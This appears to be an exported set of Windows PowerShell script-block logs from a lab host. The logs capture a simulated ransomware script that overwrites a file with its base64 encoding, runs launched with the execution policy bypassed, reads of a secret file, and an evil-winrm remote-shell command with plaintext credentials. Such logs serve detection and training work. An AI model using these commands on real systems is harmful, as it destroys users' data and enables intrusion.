Y0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQoK')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQoK')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:13:06.082+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:13:08.069+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}"
+"2025-11-16T08:13:17.865+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat  data_important.txt.recovered.txt
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat  data_important.txt.recovered.txt
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:08:47.831+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:10:00.070+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:11:01.158+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:11:29.849+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:11:32.485+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","whoami
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+whoami
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:11:32.506+0000","1
+1","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","""C:\Windows\system32\whoami.exe""
+""C:\Windows\system32\whoami.exe""","null
+null"
+"2025-11-18T11:11:40.353+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat secret.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat secret.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:11:44.562+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:12:49.921+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:12:58.565+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat data_important.txt.recovered.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat data_important.txt.recovered.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:13:24.080+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:13:24.347+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:14:01.608+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-item 'C:\Program Files\data_important.txt.encrypted').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-item 'C:\Program Files\data_important.txt.encrypted').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:14:02.137+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:14:02.744+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
+$index = 106
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
+$index = 106
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:14:51.868+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:16:33.716+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:16:34.166+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}"
+"2025-11-18T11:16:45.406+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}"
+"2025-11-18T11:17:16.274+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-18T11:17:16.274+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:03.120+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:08.167+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:11.476+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","dir
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+dir
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:18.684+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'evil-winrm -i 10.10.10.129 -u thanh -p 'thanh''
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'evil-winrm -i 10.10.10.129 -u thanh -p 'thanh''
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:26.223+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:27.456+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null",";s
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+;s
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:32.099+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:48.978+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
